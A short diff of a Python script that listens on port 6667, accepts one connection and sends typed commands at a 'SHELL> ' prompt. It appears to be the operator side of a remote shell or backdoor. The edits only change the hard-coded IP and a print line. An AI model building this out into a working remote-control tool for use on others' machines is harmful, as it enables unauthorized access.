@@ -1,6 +1,6 @@
 import socket, os, threading
 
-IP = "192.168.0.18"
+IP = "192.168.0.2"
 PORT = 6667
 BUFFER = 1024
 
@@ -12,7 +12,7 @@ print("server runing on ip:{0} and port:{1}".format(IP,PORT))
 print("\n to send server commands type: /[command]}")
 server.listen(1)
 conn, addr = server.accept()
-print("conn recived from:{0}".format(addr[1]))
+print("conn recived from:{0}".format(addr))
 if conn:
     while True:
         cmd = input("SHELL> ")
